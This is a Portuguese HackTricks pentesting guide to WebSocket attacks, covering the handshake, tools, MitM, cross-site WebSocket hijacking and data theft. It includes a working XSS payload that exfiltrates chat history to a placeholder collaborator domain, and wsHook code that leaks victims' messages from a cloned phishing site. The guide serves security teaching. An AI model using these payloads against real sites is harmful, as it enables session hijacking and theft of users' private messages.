# WebSocket Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## O que s√£o WebSockets

As conex√µes WebSocket s√£o estabelecidas atrav√©s de um **handshake HTTP** inicial e s√£o projetadas para serem **de longa dura√ß√£o**, permitindo a comunica√ß√£o bidirecional a qualquer momento sem a necessidade de um sistema transacional. Isso torna os WebSockets particularmente vantajosos para aplica√ß√µes que requerem **baixa lat√™ncia ou comunica√ß√£o iniciada pelo servidor**, como fluxos de dados financeiros ao vivo.

### Estabelecimento de Conex√µes WebSocket

Uma explica√ß√£o detalhada sobre o estabelecimento de conex√µes WebSocket pode ser acessada [**aqui**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). Em resumo, as conex√µes WebSocket geralmente s√£o iniciadas via JavaScript do lado do cliente, conforme mostrado abaixo:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
O protocolo `wss` significa uma conex√£o WebSocket segura com **TLS**, enquanto `ws` indica uma conex√£o **n√£o segura**.

Durante o estabelecimento da conex√£o, um handshake √© realizado entre o navegador e o servidor via HTTP. O processo de handshake envolve o navegador enviando uma solicita√ß√£o e o servidor respondendo, conforme ilustrado nos seguintes exemplos:

O navegador envia uma solicita√ß√£o de handshake:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Resposta de handshake do servidor:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
A conex√£o permanece aberta para troca de mensagens em ambas as dire√ß√µes uma vez estabelecida.

**Pontos Chave do Handshake WebSocket:**

- Os cabe√ßalhos `Connection` e `Upgrade` sinalizam a inicia√ß√£o de um handshake WebSocket.
- O cabe√ßalho `Sec-WebSocket-Version` indica a vers√£o do protocolo WebSocket desejada, geralmente `13`.
- Um valor aleat√≥rio codificado em Base64 √© enviado no cabe√ßalho `Sec-WebSocket-Key`, garantindo que cada handshake seja √∫nico, o que ajuda a prevenir problemas com proxies de cache. Este valor n√£o √© para autentica√ß√£o, mas para confirmar que a resposta n√£o √© gerada por um servidor ou cache mal configurado.
- O cabe√ßalho `Sec-WebSocket-Accept` na resposta do servidor √© um hash do `Sec-WebSocket-Key`, verificando a inten√ß√£o do servidor de abrir uma conex√£o WebSocket.

Esses recursos garantem que o processo de handshake seja seguro e confi√°vel, abrindo caminho para uma comunica√ß√£o em tempo real eficiente.


### Console Linux

Voc√™ pode usar `websocat` para estabelecer uma conex√£o bruta com um websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Ou para criar um servidor websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket connections

Se voc√™ descobrir que os clientes est√£o conectados a um **HTTP websocket** da sua rede local atual, voc√™ pode tentar um [ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) para realizar um ataque MitM entre o cliente e o servidor.\
Uma vez que o cliente esteja tentando se conectar, voc√™ pode usar:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Enumera√ß√£o de Websockets

Voc√™ pode usar a **ferramenta** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **para descobrir, identificar e buscar por** **vulnerabilidades** **conhecidas** em websockets automaticamente.

### Ferramentas de Depura√ß√£o de Websocket

* **Burp Suite** suporta comunica√ß√£o MitM de websockets de uma maneira muito semelhante √† que faz para comunica√ß√£o HTTP regular.
* A [**extens√£o socketsleuth**](https://github.com/snyk/socketsleuth) **do Burp Suite** permitir√° que voc√™ gerencie melhor as comunica√ß√µes de Websocket no Burp obtendo o **hist√≥rico**, definindo **regras de intercepta√ß√£o**, usando regras de **correspond√™ncia e substitui√ß√£o**, utilizando **Intruder** e **AutoRepeater.**
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** Abrevia√ß√£o de "**WebSocket/Socket.io Proxy**", esta ferramenta, escrita em Node.js, fornece uma interface de usu√°rio para **capturar, interceptar, enviar mensagens personalizadas** e visualizar todas as comunica√ß√µes de WebSocket e Socket.IO entre o cliente e o servidor.
* [**wsrepl**](https://github.com/doyensec/wsrepl) √© um **REPL interativo de websocket** projetado especificamente para testes de penetra√ß√£o. Ele fornece uma interface para observar **mensagens de websocket recebidas e enviar novas**, com uma estrutura f√°cil de usar para **automatizar** essa comunica√ß√£o.&#x20;
* [**https://websocketking.com/**](https://websocketking.com/) √© uma **web para se comunicar** com outras webs usando **websockets**.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) entre outros tipos de comunica√ß√µes/protocolos, fornece uma **web para se comunicar** com outras webs usando **websockets.**

## Laborat√≥rio de Websocket

No [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) voc√™ tem um c√≥digo para lan√ßar uma web usando websockets e em [**este post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) voc√™ pode encontrar uma explica√ß√£o.

## Sequestro de WebSocket entre Sites (CSWSH)

**Sequestro de WebSocket entre sites**, tamb√©m conhecido como **sequestro de WebSocket de origem cruzada**, √© identificado como um caso espec√≠fico de **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** que afeta os handshakes de WebSocket. Essa vulnerabilidade surge quando os handshakes de WebSocket se autenticam exclusivamente via **cookies HTTP** sem **tokens CSRF** ou medidas de seguran√ßa semelhantes.

Os atacantes podem explorar isso hospedando uma **p√°gina web maliciosa** que inicia uma conex√£o de WebSocket entre sites para um aplicativo vulner√°vel. Consequentemente, essa conex√£o √© tratada como parte da sess√£o da v√≠tima com o aplicativo, explorando a falta de prote√ß√£o CSRF no mecanismo de gerenciamento de sess√£o.

### Ataque Simples

Observe que ao **estabelecer** uma conex√£o de **websocket**, o **cookie** √© **enviado** ao servidor. O **servidor** pode estar usando isso para **relacionar** cada **usu√°rio espec√≠fico** com sua **sess√£o de websocket com base no cookie enviado**.

Ent√£o, se por **exemplo** o **servidor de websocket** **enviar de volta o hist√≥rico da conversa** de um usu√°rio se uma mensagem com "**READY"** for enviada, ent√£o um **XSS simples** estabelecendo a conex√£o (o **cookie** ser√° **enviado** **automaticamente** para autorizar o usu√°rio v√≠tima) **enviando** "**READY**" ser√° capaz de **recuperar** o hist√≥rico da **conversa**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie com um subdom√≠nio diferente

Neste post do blog [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/), o atacante conseguiu **executar Javascript arbitr√°rio em um subdom√≠nio** do dom√≠nio onde a comunica√ß√£o do web socket estava ocorrendo. Como era um **subdom√≠nio**, o **cookie** estava sendo **enviado**, e como o **Websocket n√£o verificou o Origin corretamente**, foi poss√≠vel se comunicar com ele e **roubar tokens dele**.

### Roubo de dados do usu√°rio

Copie a aplica√ß√£o web que voc√™ deseja imitar (os arquivos .html, por exemplo) e dentro do script onde a comunica√ß√£o do websocket est√° ocorrendo, adicione este c√≥digo:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Agora baixe o arquivo `wsHook.js` de [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) e **salve-o dentro da pasta com os arquivos da web**.\
Expondo a aplica√ß√£o web e fazendo um usu√°rio se conectar a ela, voc√™ poder√° roubar as mensagens enviadas e recebidas via websocket:
```javascript
sudo python3 -m http.server 80
```
## Condi√ß√µes de Corrida

Condi√ß√µes de Corrida em WebSockets tamb√©m s√£o uma realidade, [verifique esta informa√ß√£o para saber mais](race-condition.md#rc-in-websockets).

## Outras vulnerabilidades

Como os Web Sockets s√£o um mecanismo para **enviar dados para o lado do servidor e do cliente**, dependendo de como o servidor e o cliente lidam com as informa√ß√µes, **os Web Sockets podem ser usados para explorar v√°rias outras vulnerabilidades como XSS, SQLi ou qualquer outra vulnerabilidade web comum usando a entrada de um usu√°rio de um websocket.**

## **WebSocket Smuggling**

Essa vulnerabilidade poderia permitir que voc√™ **contornasse as restri√ß√µes de proxies reversos** fazendo-os acreditar que uma **comunica√ß√£o websocket foi estabelecida** (mesmo que n√£o seja verdade). Isso poderia permitir que um atacante **acessasse endpoints ocultos**. Para mais informa√ß√µes, verifique a p√°gina a seguir:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## Refer√™ncias

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
